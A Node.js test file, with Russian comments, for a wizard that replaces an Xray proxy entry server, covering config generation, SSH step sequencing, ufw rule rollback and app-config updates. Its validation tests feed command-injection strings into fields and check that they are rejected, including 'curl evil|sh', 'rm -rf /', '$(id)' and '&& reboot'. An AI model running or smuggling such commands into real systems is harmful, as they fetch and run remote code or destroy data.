'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { buildReplacementConfig } = require('../src/core/replace/entry-config');

// Снимок старого входа: у user1 РАЗНЫЕ UUID на двух inbound, fb1 есть только на Vision.
// Клиенты в снимке — настоящие UUID: мастер замены отклоняет всё, что на UUID не похоже.
const U1X = '11111111-1111-4111-8111-111111111111';
const U1V = '22222222-2222-4222-8222-222222222222';
const FB1 = '33333333-3333-4333-8333-333333333333';
const inventory = {
  inbounds: [
    { tag: 'inbound-443', port: 443, net: 'xhttp', sni: 'old.example', pbk: 'OLD', sid: 'ab', path: '/old', mode: 'auto', flow: '' },
    { tag: 'inbound-8443', port: 8443, net: 'tcp', sni: 'old.example', pbk: 'OLD', sid: 'ab', path: '', mode: '', flow: 'xtls-rprx-vision' },
  ],
  keys: [
    { name: 'user1', entries: [
      { tag: 'inbound-443', id: U1X, email: 'user1-xhttp' },
      { tag: 'inbound-8443', id: U1V, email: 'user1-vision' },
    ] },
    { name: 'fb1', entries: [{ tag: 'inbound-8443', id: FB1, email: 'fb1' }] },
  ],
};
const link = { port: 443, uuid: 'L1', flow: 'xtls-rprx-vision', publicKey: 'PUB', shortId: 'cd', sni: 'exit-mask.example.org' };
const args = {
  inventory, link, exitHost: '198.51.100.20',
  reality: { privateKey: 'PRIV', shortId: 'ef', sni: 'new.example' },
  xhttpPath: '/newpath', statsPort: 10085,
};
const cfg = buildReplacementConfig(args);
const inb = (tag) => cfg.inbounds.find((i) => i.tag === tag);

test('теги и порты inbound совпадают с инвентарём', () => {
  assert.deepEqual(cfg.inbounds.map((i) => [i.tag, i.port]), [['inbound-443', 443], ['inbound-8443', 8443]]);
});

test('у каждого inbound свои UUID; ключ только на Vision не попадает на XHTTP', () => {
  assert.deepEqual(inb('inbound-443').settings.clients, [{ id: U1X, email: 'user1-xhttp' }]);
  assert.deepEqual(inb('inbound-8443').settings.clients, [
    { id: U1V, email: 'user1-vision', flow: 'xtls-rprx-vision' },
    { id: FB1, email: 'fb1', flow: 'xtls-rprx-vision' },
  ]);
});

test('xhttp: новый путь и режим из снимка', () => {
  const x = inb('inbound-443').streamSettings;
  assert.equal(x.network, 'xhttp');
  assert.equal(x.xhttpSettings.path, '/newpath');
  assert.equal(x.xhttpSettings.mode, 'auto');
  assert.equal(inb('inbound-8443').streamSettings.network, 'tcp');
});

test('Reality: новый SNI, ключ и shortId', () => {
  const r = inb('inbound-8443').streamSettings.realitySettings;
  assert.deepEqual(r.serverNames, ['new.example']);
  assert.equal(r.dest, 'new.example:443');
  assert.equal(r.privateKey, 'PRIV');
  assert.deepEqual(r.shortIds, ['ef']);
});

test('outbound exit берёт параметры звена', () => {
  const o = cfg.outbounds.find((x) => x.tag === 'exit');
  const v = o.settings.vnext[0];
  assert.equal(v.address, '198.51.100.20');
  assert.equal(v.port, 443);
  assert.deepEqual(v.users[0], { id: 'L1', encryption: 'none', flow: 'xtls-rprx-vision' });
  assert.equal(o.streamSettings.realitySettings.serverName, 'exit-mask.example.org');
  assert.equal(o.streamSettings.realitySettings.publicKey, 'PUB');
  assert.equal(o.streamSettings.realitySettings.shortId, 'cd');
});

test('routing: блокировки первыми, всё остальное в exit', () => {
  const rules = cfg.routing.rules;
  assert.deepEqual(rules[0].protocol, ['bittorrent']);
  assert.equal(rules[0].outboundTag, 'block');
  assert.ok(rules[1].ip.includes('geoip:private'));
  assert.equal(rules[1].outboundTag, 'block');
  const last = rules[rules.length - 1];
  assert.deepEqual(last.inboundTag, ['inbound-443', 'inbound-8443']);
  assert.equal(last.outboundTag, 'exit');
});

test('api/stats/policy/log как в common()', () => {
  assert.equal(cfg.api.listen, '127.0.0.1:10085');
  assert.deepEqual(cfg.stats, {});
  assert.equal(cfg.log.loglevel, 'warning');
  assert.ok(cfg.policy.levels[0].statsUserUplink);
});

// ---------- Источник клиентов (Task 3) ----------
const { pickClients } = require('../src/core/replace/source');
const DAY = 24 * 3600 * 1000;
const NOW = Date.parse('2026-11-10T12:00:00Z');
const ago = (d) => new Date(NOW - d * DAY).toISOString();

test('pickClients: живой инвентарь выигрывает у снимка', () => {
  const r = pickClients({ live: inventory, cache: { inventory: { x: 1 }, savedAt: ago(1) }, now: NOW });
  assert.equal(r.from, 'live');
  assert.equal(r.inventory, inventory);
  assert.equal(r.stale, false);
});

test('pickClients: свежий снимок (2 дня) не устарел', () => {
  const r = pickClients({ live: null, cache: { inventory, savedAt: ago(2) }, now: NOW });
  assert.equal(r.from, 'cache');
  assert.equal(r.stale, false);
  assert.equal(r.savedAt, ago(2));
});

test('pickClients: снимок 10 дней — stale (мастер должен попросить подтверждение)', () => {
  const r = pickClients({ live: null, cache: { inventory, savedAt: ago(10) }, now: NOW });
  assert.equal(r.stale, true);
  assert.equal(r.savedAt, ago(10));
});

test('pickClients: ни связи, ни снимка — ошибка', () => {
  assert.throws(() => pickClients({ live: null, cache: null, now: NOW }), /сохранённой копии/);
});

// ---------- Шаги мастера замены (Task 4) ----------
const { spawnSync } = require('node:child_process');
const { runSteps } = require('../src/core/provision/runner');
const { buildReplaceSteps } = require('../src/core/replace/steps');
const { XRAY_STABLE_PY } = require('../src/core/provision/steps');

const NEW = '3.3.3.3';
const EXIT = '2.2.2.2';
const PASSWORD = 'Pw$ecret"1';
const cleanHost = 'os=ubuntu\nver=24.04\narch=x86_64\nxray=no\nbusy=\ndisk_mb=9000\nmanifest=none\n';
const RULE = `allow from ${NEW} to any port 443 proto tcp`;
const GUARD = 'vpsmon-exit-guard-3-3-3-3-443';
const goodProbe = { ok: true, probes: [{ inbound: 'inbound-443', sni: 'near.com', http: '204', exitIp: EXIT, ok: true }] };
const badProbe = { ok: false, probes: [
  { inbound: 'inbound-443', sni: 'near.com', http: '204', exitIp: EXIT, ok: true },
  { inbound: 'inbound-8443', sni: 'near.com', http: '000', exitIp: '', ok: false },
] };

// Запускает настоящий Python-код проверки стабильности с подставленными состояниями службы.
function runStable(code, states) {
  const wrapper = [
    'import json,sys',
    'src=sys.stdin.read()',
    "g={'__name__':'vpsmon_test'}",
    'exec(src,g)',
    'it=iter(json.loads(sys.argv[1]))',
    "ok=g['stable'](show=lambda: next(it, {'ActiveState':'failed','NRestarts':'99'}), sleep=lambda s: None)",
    'sys.exit(0 if ok else 1)',
  ].join('\n');
  return spawnSync('python', ['-c', wrapper, JSON.stringify(states)], { input: code, encoding: 'utf8' }).status;
}

// Фейковые новый вход и выход. Выход отвечает на exit-link и на проверку правила.
function replaceWorld({ probe = goodProbe, ruleExists = false, guardActive = false, failOn = null, failText = 'сбой', xrayStates = null, precheck = [], linkNetwork = 'tcp' } = {}) {
  const log = [];
  const prechecks = [...precheck]; // ответы precheck по очереди, дальше — чистый сервер
  const connect = async (target, auth) => {
    log.push({ host: target.host, kind: 'connect', auth: auth.password ? 'password' : 'key' });
    return {
      exec: async (cmd) => {
        const m = cmd.match(/echo (\S+) \| base64 -d/);
        const script = m ? Buffer.from(m[1], 'base64').toString() : cmd;
        log.push({ host: target.host, kind: 'exec', script });
        if (failOn && script.includes(failOn)) return `${failText}\n@@rc=1\n`;
        if (script.includes('# step:precheck')) return `${prechecks.shift() ?? cleanHost}@@rc=0\n`;
        if (script.includes('# step:keygen')) return 'PrivateKey: PRIV\nPassword (PublicKey): PUB\n@@rc=0\n';
        if (script.includes('# step:sni-probe')) {
          return `${JSON.stringify([{ domain: 'near.com', ms: 5, tls13: true, h2: true, x25519: true, redirect: false }])}\n@@rc=0\n`;
        }
        if (script.includes('# step:exit-link')) return `${JSON.stringify({ ok: true, ...link, network: linkNetwork })}\n@@rc=0\n`;
        if (script.includes('# step:exit-check')) {
          return `Added user rules:\n${ruleExists ? `ufw ${RULE}\n` : ''}@@guard=${guardActive ? 'active' : 'inactive'}\n@@rc=0\n`;
        }
        if (script.includes('# step:probe')) return `${JSON.stringify(probe)}\n@@rc=0\n`;
        if (script.includes('# step:verify') && xrayStates) {
          const inner = script.match(/echo (\S+) \| base64 -d \| python3/);
          const rc = runStable(Buffer.from(inner[1], 'base64').toString(), xrayStates);
          return rc === 0 ? 'ok\n@@rc=0\n' : 'Xray не держится запущенным\n@@rc=1\n';
        }
        return 'ok\n@@rc=0\n';
      },
      close() {},
    };
  };
  const progress = [];
  const ctx = {
    connect,
    makeKey: () => ({ private: 'APPPRIV', public: 'ssh-ed25519 AAAA vpsmon' }),
    saveKey: (id) => `/k/${id}`,
    deleteKey: () => {},
    chooseSni: async (_t, list) => list[0].domain,
    uuid: () => 'UUID',
    randomHex: (n) => 'ab'.repeat(n),
    secrets: [],
  };
  return { log, ctx, progress, onProgress: (e) => progress.push(JSON.stringify(e)) };
}

const replacePlan = () => ({
  target: { id: 'new1', name: 'Новый вход', host: NEW, password: PASSWORD, limit: { tb: 1, resetDay: 1, mode: 'both' }, ports: [443, 8443] },
  old: { id: 'old1', name: 'Старый вход', host: '4.4.4.4', exitHost: EXIT },
  exit: { id: 'ams', name: 'Амстердам', host: EXIT, keyPath: '/k/ams' },
  source: { inventory, from: 'live', savedAt: null },
});
const execs = (log, host) => log.filter((x) => x.kind === 'exec' && x.host === host).map((x) => x.script);
const markers = (scripts) => scripts.map((s) => s.match(/# step:([\w-]+)/)[1]);

test('замена: порядок шагов', () => {
  assert.deepEqual(buildReplaceSteps(replacePlan()).map((s) => s.id), [
    'connect', 'precheck', 'exit-link', 'app-key', 'fail2ban', 'xray', 'sni', 'config', 'sysctl',
    'firewall', 'collector', 'verify', 'exit-allow', 'probe', 'finish',
  ]);
});

test('замена: конфиг нового входа с клиентами из снимка и звеном с выхода', async () => {
  const w = replaceWorld();
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.ok, true, r.error);
  const script = execs(w.log, NEW).find((s) => s.includes('# step:config'));
  assert.match(script, /chgrp xray/);
  assert.match(script, /chmod 640/);
  assert.ok(script.indexOf('xray run -test') < script.indexOf('systemctl restart xray'));
  const cfg = JSON.parse(Buffer.from(script.match(/echo (\S+) \| base64 -d > "\$TMP"/)[1], 'base64').toString());
  const text = JSON.stringify(cfg);
  for (const s of [U1X, U1V, 'user1-xhttp', FB1]) assert.ok(text.includes(s), s);
  const out = cfg.outbounds.find((o) => o.tag === 'exit');
  assert.equal(out.settings.vnext[0].address, EXIT);
  assert.deepEqual(out.settings.vnext[0].users[0], { id: 'L1', encryption: 'none', flow: 'xtls-rprx-vision' });
  assert.deepEqual(cfg.inbounds[0].streamSettings.realitySettings.serverNames, ['near.com']);
  assert.equal(cfg.inbounds[0].streamSettings.realitySettings.privateKey, 'PRIV');
  assert.equal(cfg.inbounds[0].streamSettings.xhttpSettings.path, '/abababab');
  assert.deepEqual(cfg.inbounds[0].streamSettings.realitySettings.shortIds, ['abababababababab']);
});

test('замена: на выходе только чтение звена и одно правило ufw с таймером', async () => {
  const w = replaceWorld();
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.ok, true, r.error);
  assert.ok(w.log.filter((x) => x.host === EXIT && x.kind === 'connect').every((x) => x.auth === 'key'));
  const ex = execs(w.log, EXIT);
  assert.deepEqual(markers(ex), ['exit-link', 'exit-check', 'exit-allow', 'exit-release']);
  const all = ex.join('\n');
  const allow = ex[2];
  const guard = allow.indexOf(`systemd-run --on-active=600 --unit=${GUARD} /usr/sbin/ufw delete ${RULE}`);
  assert.ok(guard >= 0 && guard < allow.indexOf(`\nufw ${RULE}`), 'таймер взводится до правила');
  assert.ok(ex[3].includes(`systemctl stop ${GUARD}.timer`));
  assert.ok(ex[1].includes(`systemctl is-active ${GUARD}.timer`));
  assert.ok(!/ufw (--force )?disable/.test(all));
  assert.ok(!/systemctl (re)?start xray|systemctl restart/.test(all));
  assert.ok(!/(>|\bmv |\bcp |\btee ).*(etc\/xray|config\.json)/.test(all));
  assert.ok(!/ufw (default|enable|reset)/.test(all));
  const s = w.ctx.result.server;
  assert.equal(s.id, 'new1');
  assert.equal(s.role, 'Вход → Амстердам');
  assert.equal(s.exitHost, EXIT);
  assert.equal(s.statsPort, 10085);
  assert.deepEqual(s.ports, [443, 8443]);
  assert.equal(s.managed, true);
  assert.equal(s.keyPath, '/k/new1');
  assert.equal(s.modes, undefined);
  const fw = execs(w.log, NEW).find((x) => x.includes('# step:firewall'));
  assert.match(fw, /ufw allow 443\/tcp\nufw allow 8443\/tcp/);
  const probe = execs(w.log, NEW).find((x) => x.includes('# step:probe'));
  assert.ok(probe.includes('def probe('), 'на новом входе запускается cascade-tune.py');
});

test('замена: правило на выходе уже было — не трогаем, таймер не ставим, при откате не удаляем', async () => {
  const w = replaceWorld({ ruleExists: true, probe: badProbe });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.failedStep, 'probe');
  assert.deepEqual(markers(execs(w.log, EXIT)), ['exit-link', 'exit-check']);
});

test('замена: путь через выход не работает — откат правила и нового сервера (Review Focus 3)', async () => {
  const w = replaceWorld({ probe: badProbe });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.ok, false);
  assert.equal(r.failedStep, 'probe');
  assert.match(r.error, /inbound-8443\/near\.com/);
  assert.ok(!r.error.includes('inbound-443/'), 'удачные проверки не перечисляются');
  const undo = execs(w.log, EXIT).find((s) => s.includes('# step:exit-undo'));
  assert.ok(undo && undo.includes(`ufw delete ${RULE}`));
  assert.ok(undo.includes(`systemctl stop ${GUARD}.timer`));
  assert.ok(execs(w.log, NEW).some((s) => s.includes('# step:remove')));
  assert.equal(w.ctx.result, undefined);
});

test('замена: сбой до правила на выходе — выход не трогается, новый сервер откатывается', async () => {
  const w = replaceWorld({ failOn: '# step:xray' });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.failedStep, 'xray');
  assert.deepEqual(markers(execs(w.log, EXIT)), ['exit-link']);
  assert.ok(execs(w.log, NEW).some((s) => s.includes('# step:remove')));
});

test('замена: UUID, ключ Reality и пароль не попадают в ошибки и прогресс', async () => {
  const leak = `xray: bad client ${U1X} ${U1V} ${FB1} link L1 key PRIV pass ${PASSWORD}`;
  const w = replaceWorld({ failOn: '# step:config', failText: leak });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.failedStep, 'config');
  for (const s of [U1X, U1V, FB1, 'L1', 'PRIV', PASSWORD]) {
    assert.ok(!r.error.includes(s), `ошибка содержит ${s}`);
    assert.ok(w.progress.every((p) => !p.includes(s)), `прогресс содержит ${s}`);
  }
});

test('verify: Xray в цикле падений — шаг падает, стабильный — проходит', async () => {
  const loop = [1, 2, 3, 4, 5, 6, 7, 8].map((n) => ({ ActiveState: n % 2 ? 'active' : 'activating', NRestarts: String(n) }));
  const flap = [1, 2, 3, 4, 5, 6].map((n) => ({ ActiveState: 'active', NRestarts: String(n) }));
  const steady = Array.from({ length: 5 }, () => ({ ActiveState: 'active', NRestarts: '0' }));
  assert.equal(runStable(XRAY_STABLE_PY, loop), 1);
  assert.equal(runStable(XRAY_STABLE_PY, flap), 1, 'active с растущим NRestarts — не здоров');
  assert.equal(runStable(XRAY_STABLE_PY, steady), 0);

  const bad = replaceWorld({ xrayStates: loop });
  const r = await runSteps(buildReplaceSteps(replacePlan()), bad.ctx, bad.onProgress);
  assert.equal(r.failedStep, 'verify');
  assert.ok(execs(bad.log, NEW).some((s) => s.includes('# step:remove')));
  const good = replaceWorld({ xrayStates: steady });
  assert.equal((await runSteps(buildReplaceSteps(replacePlan()), good.ctx, good.onProgress)).ok, true);
});

test('замена: правило с живым СВОИМ таймером (прошлая попытка) — не добавляем, finish снимает таймер', async () => {
  const w = replaceWorld({ ruleExists: true, guardActive: true });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.ok, true, r.error);
  const ex = execs(w.log, EXIT);
  assert.deepEqual(markers(ex), ['exit-link', 'exit-check', 'exit-release']);
  assert.ok(ex[2].includes(`systemctl stop ${GUARD}.timer`));
  assert.ok(!ex.join('\n').includes('systemd-run'), 'таймер не перевзводится');
  // Только таймер этого правила: общий vpsmon-exit-guard и чужие таймеры не трогаются.
  assert.ok(!/vpsmon-exit-guard(\.| )/.test(ex.join('\n')));
});

test('замена: правило с живым своим таймером и сбой probe — правило удаляется при откате', async () => {
  const w = replaceWorld({ ruleExists: true, guardActive: true, probe: badProbe });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.failedStep, 'probe');
  const ex = execs(w.log, EXIT);
  assert.deepEqual(markers(ex), ['exit-link', 'exit-check', 'exit-undo']);
  assert.ok(ex[2].includes(`ufw delete ${RULE}`));
  assert.ok(ex[2].includes(`systemctl stop ${GUARD}.timer`));
});

test('замена: правило без таймера (постоянное) — не трогаем и при успехе', async () => {
  const w = replaceWorld({ ruleExists: true, guardActive: false });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.ok, true, r.error);
  assert.deepEqual(markers(execs(w.log, EXIT)), ['exit-link', 'exit-check']);
});

test('замена: план с плохим адресом или без ключа выхода отклоняется до первого шага', () => {
  const bad = (fn) => () => { const p = replacePlan(); fn(p); return buildReplaceSteps(p); };
  assert.throws(bad((p) => { p.target.host = '1.2.3.4; rm -rf /'; }), /IPv4/);
  assert.throws(bad((p) => { p.target.host = 'vps.example.com'; }), /IPv4/);
  assert.throws(bad((p) => { p.exit.host = 'ams.example.com'; }), /IPv4/);
  assert.throws(bad((p) => { p.exit.host = '2.2.2.2 && reboot'; }), /IPv4/);
  assert.throws(bad((p) => { delete p.exit.keyPath; }), /ключ/);
  assert.doesNotThrow(bad(() => {}));
});

// --- Task 5: запись о замене в конфиге приложения ---

const { markReplaced, activeEntryForExit, exitAccessDeleteCommand } = require('../src/core/app-config');

const appConfig = () => ({
  pollSeconds: 30,
  servers: [
    { id: 'vpsr', name: 'Москва', host: '203.0.113.10', exitHost: '198.51.100.20', statsPort: 10085 },
    { id: 'vpsg', name: 'Амстердам', host: '198.51.100.20', exitHost: null },
  ],
});
const newEntry = { id: 's5_6_7_8', name: 'Новая Москва', host: '5.6.7.8', exitHost: '198.51.100.20', statsPort: 10085, managed: true };

test('markReplaced: добавляет новый вход и помечает старый, исходный конфиг не меняется', () => {
  const before = appConfig();
  const next = markReplaced(before, 'vpsr', newEntry);
  assert.deepEqual(next.servers.map((s) => s.id), ['vpsr', 'vpsg', 's5_6_7_8']);
  assert.equal(next.servers[0].replacedBy, 's5_6_7_8');
  assert.equal(next.pollSeconds, 30);
  assert.equal(before.servers[0].replacedBy, undefined);
  assert.equal(before.servers.length, 2);
});

test('markReplaced: отказ для выхода, уже заменённого, неизвестного id и повторного адреса', () => {
  assert.throws(() => markReplaced(appConfig(), 'vpsg', newEntry), /не вход/);
  const once = markReplaced(appConfig(), 'vpsr', newEntry);
  assert.throws(() => markReplaced(once, 'vpsr', { ...newEntry, id: 's9_9_9_9', host: '9.9.9.9' }), /уже заменён/);
  assert.throws(() => markReplaced(appConfig(), 'nope', newEntry), /Неизвестный сервер/);
  assert.throws(() => markReplaced(appConfig(), 'vpsr', { ...newEntry, id: 'x', host: '198.51.100.20' }), /уже есть/);
});

test('activeEntryForExit: заменённый вход пропускается', () => {
  assert.equal(activeEntryForExit(appConfig(), '198.51.100.20').id, 'vpsr');
  const next = markReplaced(appConfig(), 'vpsr', newEntry);
  assert.equal(activeEntryForExit(next, '198.51.100.20').id, 's5_6_7_8');
  assert.equal(activeEntryForExit(next, '1.1.1.1'), undefined);
});

test('exitAccessDeleteCommand: точное правило, плохой адрес или порт отклоняются', () => {
  assert.equal(exitAccessDeleteCommand('203.0.113.10', 443), 'ufw delete allow from 203.0.113.10 to any port 443 proto tcp');
  assert.throws(() => exitAccessDeleteCommand('1.2.3.4; ufw disable', 443), /IPv4/);
  assert.throws(() => exitAccessDeleteCommand('1.2.3.4', '443; reboot'), /порт/);
  assert.throws(() => exitAccessDeleteCommand('1.2.3.4', 70000), /порт/);
});

// ---------- Исправления по финальному ревью ----------

test('I1 pickClients: числовой savedAt (мс, как пишет saveInventoryCache)', () => {
  const fresh = pickClients({ live: null, cache: { inventory, savedAt: NOW - 2 * DAY }, now: NOW });
  assert.equal(fresh.stale, false);
  assert.equal(fresh.savedAt, NOW - 2 * DAY);
  const old = pickClients({ live: null, cache: { inventory, savedAt: NOW - 10 * DAY }, now: NOW });
  assert.equal(old.stale, true);
  // Мусор вместо даты — по-прежнему устаревший снимок.
  assert.equal(pickClients({ live: null, cache: { inventory, savedAt: 'вчера' }, now: NOW }).stale, true);
});

const incompleteHost = cleanHost.replace('manifest=none', 'manifest=incomplete');

test('I2 makeReplacePlan: флаг «убрать следы» из формы попадает в план', () => {
  const { makeReplacePlan } = require('../src/core/replace/steps');
  const base = { target: { host: NEW }, old: { id: 'old1' }, exit: { host: EXIT }, picked: { inventory, from: 'cache', savedAt: 5 } };
  const p = makeReplacePlan({ ...base, cleanIncomplete: true });
  assert.equal(p.cleanIncomplete, true);
  assert.deepEqual(p.source, { inventory, from: 'cache', savedAt: 5 });
  assert.equal(makeReplacePlan({ ...base, cleanIncomplete: 'да' }).cleanIncomplete, true);
  assert.equal(makeReplacePlan(base).cleanIncomplete, false);
  assert.equal(makeReplacePlan({ ...base, picked: { inventory, from: 'live' } }).source.savedAt, null);
});

test('I2 замена: незавершённая прошлая установка — с флагом чистим и идём дальше, без флага отказ', async () => {
  const w = replaceWorld({ precheck: [incompleteHost] });
  const r = await runSteps(buildReplaceSteps({ ...replacePlan(), cleanIncomplete: true }), w.ctx, w.onProgress);
  assert.equal(r.ok, true, r.error);
  const m = execs(w.log, NEW).map((s) => (s.match(/# step:([\w-]+)/) || [])[1]);
  assert.deepEqual(m.slice(0, 3), ['precheck', 'remove', 'precheck'], 'remove.py идёт сразу после первой проверки');

  const w2 = replaceWorld({ precheck: [incompleteHost] });
  const r2 = await runSteps(buildReplaceSteps(replacePlan()), w2.ctx, w2.onProgress);
  assert.equal(r2.failedStep, 'precheck');
  assert.match(r2.error, /не завершена/);
});

test('M1 откат правила на выходе: сначала удаляем правило, потом снимаем таймер', async () => {
  const w = replaceWorld({ probe: badProbe });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.failedStep, 'probe');
  const undo = execs(w.log, EXIT).find((s) => s.includes('# step:exit-undo'));
  assert.ok(undo.indexOf(`ufw delete ${RULE}`) >= 0);
  assert.ok(undo.indexOf(`ufw delete ${RULE}`) < undo.indexOf(`systemctl stop ${GUARD}.timer`), 'правило удаляется раньше, чем снимается таймер');
});

// Снимок с пустым inbound: на нём не осталось ни одного клиента.
const withEmpty = {
  inbounds: [...inventory.inbounds, { tag: 'inbound-2053', port: 2053, net: 'xhttp', mode: 'auto', flow: '' }],
  keys: inventory.keys,
};

test('M2 buildReplacementConfig: inbound без клиентов пропускается', () => {
  const c = buildReplacementConfig({ ...args, inventory: withEmpty });
  assert.deepEqual(c.inbounds.map((i) => i.tag), ['inbound-443', 'inbound-8443']);
  assert.deepEqual(c.routing.rules[c.routing.rules.length - 1].inboundTag, ['inbound-443', 'inbound-8443']);
});

test('M2 замена: порт пустого inbound не открывается и не попадает в запись сервера', async () => {
  const w = replaceWorld();
  const plan = replacePlan();
  plan.source = { ...plan.source, inventory: withEmpty };
  const r = await runSteps(buildReplaceSteps(plan), w.ctx, w.onProgress);
  assert.equal(r.ok, true, r.error);
  assert.deepEqual(w.ctx.result.server.ports, [443, 8443]);
  const fw = execs(w.log, NEW).find((x) => x.includes('# step:firewall'));
  assert.ok(!fw.includes('2053'));
});

test('M2 замена: в снимке нет ни одного клиента — отказ до первого шага', () => {
  const plan = replacePlan();
  plan.source = { ...plan.source, inventory: { inbounds: inventory.inbounds, keys: [] } };
  assert.throws(() => buildReplaceSteps(plan), /клиент/);
});

test('M3 buildReplacementConfig: inbound без net считается tcp', () => {
  const inv = { inbounds: [{ ...inventory.inbounds[1], net: null }], keys: inventory.keys };
  const c = buildReplacementConfig({ ...args, inventory: inv });
  assert.equal(c.inbounds[0].streamSettings.network, 'tcp');
  const inv2 = { inbounds: [{ ...inventory.inbounds[1], net: undefined }], keys: inventory.keys };
  assert.equal(buildReplacementConfig({ ...args, inventory: inv2 }).inbounds[0].streamSettings.network, 'tcp');
});

test('M3 замена: звено на выходе не по TCP — отказ на шаге exit-link, выход не меняется', async () => {
  const w = replaceWorld({ linkNetwork: 'xhttp' });
  const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
  assert.equal(r.failedStep, 'exit-link');
  assert.match(r.error, /TCP/);
  assert.deepEqual(markers(execs(w.log, EXIT)), ['exit-link']);
  // raw — новое имя tcp в Xray, оно подходит.
  const ok = replaceWorld({ linkNetwork: 'raw' });
  assert.equal((await runSteps(buildReplaceSteps(replacePlan()), ok.ctx, ok.onProgress)).ok, true);
});

const { canCloseExitAccess, clearReplacedBy, undoReplace, removeServer: removeServerCfg } = require('../src/core/app-config');

test('I3 canCloseExitAccess: подписки ещё на старом входе или не опубликованы — нельзя', () => {
  const server = { id: 'vpsr', name: 'Москва', replacedBy: 's5_6_7_8' };
  assert.deepEqual(canCloseExitAccess({ server, subsEntry: 's5_6_7_8', subsPending: false }), { ok: true });
  const onOld = canCloseExitAccess({ server, subsEntry: 'vpsr', subsPending: false });
  assert.equal(onOld.ok, false);
  assert.match(onOld.reason, /Подписки/);
  const pending = canCloseExitAccess({ server, subsEntry: 's5_6_7_8', subsPending: true });
  assert.equal(pending.ok, false);
  assert.match(pending.reason, /опубликуй/i);
  const notReplaced = canCloseExitAccess({ server: { id: 'vpsr', name: 'Москва' }, subsEntry: 'x', subsPending: false });
  assert.equal(notReplaced.ok, false);
  assert.match(notReplaced.reason, /заменённого/);
});

test('I4a clearReplacedBy: убранный новый вход снимает пометку со старого', () => {
  const replaced = markReplaced(appConfig(), 'vpsr', newEntry);
  const next = clearReplacedBy(removeServerCfg(replaced, 's5_6_7_8'), 's5_6_7_8');
  assert.ok(!('replacedBy' in next.servers.find((s) => s.id === 'vpsr')));
  assert.equal(replaced.servers[0].replacedBy, 's5_6_7_8', 'исходный конфиг не меняется');
  // Чужие пометки не трогаются.
  assert.equal(clearReplacedBy(replaced, 'other').servers[0].replacedBy, 's5_6_7_8');
});

test('I4b undoReplace: снимает пометку и возвращает id нового входа; не заменённый — отказ', () => {
  const replaced = markReplaced(appConfig(), 'vpsr', newEntry);
  const { config, newId } = undoReplace(replaced, 'vpsr');
  assert.equal(newId, 's5_6_7_8');
  assert.ok(!('replacedBy' in config.servers.find((s) => s.id === 'vpsr')));
  assert.ok(config.servers.some((s) => s.id === 's5_6_7_8'), 'новый вход остаётся обычным входом');
  assert.equal(replaced.servers[0].replacedBy, 's5_6_7_8');
  assert.throws(() => undoReplace(appConfig(), 'vpsr'), /не заменён/);
  assert.throws(() => undoReplace(appConfig(), 'nope'), /Неизвестный сервер/);
});

test('canCloseExitAccess: без сайта подписок (домен не задан) подписки не блокируют', () => {
  const server = { id: 's1', name: 'Старый', replacedBy: 's2' };
  assert.deepEqual(canCloseExitAccess({ server, subsEntry: 's1', subsPending: true, subsInUse: false }), { ok: true });
  // С сайтом — прежняя защита.
  assert.equal(canCloseExitAccess({ server, subsEntry: 's1', subsPending: false, subsInUse: true }).ok, false);
  assert.equal(canCloseExitAccess({ server, subsEntry: 's2', subsPending: true, subsInUse: true }).ok, false);
});

// --- Аудит 0.2.1: снимок со старого входа может быть подменён ---
const { validateInventory } = require('../src/core/replace/entry-config');

test('H1 снимок старого входа: настоящий проходит, подменённые порты/теги/UUID отклоняются', () => {
  validateInventory(inventory);
  const clone = () => JSON.parse(JSON.stringify(inventory));
  const cases = [
    (v) => { v.inbounds[0].port = "443'; curl evil|sh; '"; },
    (v) => { v.inbounds[0].port = 22; },
    (v) => { v.inbounds[0].port = 10085; },
    (v) => { v.inbounds[1].port = v.inbounds[0].port; },
    (v) => { v.inbounds[0].tag = 'x;rm -rf /'; },
    (v) => { v.keys[0].entries[0].tag = 'a b'; },
    (v) => { v.inbounds[1].flow = 'evil'; },
    (v) => { v.inbounds[0].net = 'ws'; },
    (v) => { v.inbounds[0].mode = '$(id)'; },
    (v) => { v.keys[0].entries[0].id = 'not-a-uuid'; },
    (v) => { v.keys[0].entries[0].email = 'a"b'; },
    (v) => { v.keys[0].name = 'a b'; },
    (v) => { delete v.inbounds; },
  ];
  for (const [i, mutate] of cases.entries()) {
    const v = clone();
    mutate(v);
    assert.throws(() => validateInventory(v), undefined, `случай ${i}`);
  }
});

test('H1 мастер замены не стартует с подменённым снимком', () => {
  const bad = JSON.parse(JSON.stringify(inventory));
  bad.inbounds[0].port = "443'; touch /tmp/pwned; '";
  assert.throws(() => buildReplaceSteps({
    target: { host: '203.0.113.50', password: 'x' }, exit: { host: '198.51.100.20', keyPath: '/k' },
    source: { inventory: bad }, link: {},
  }));
});
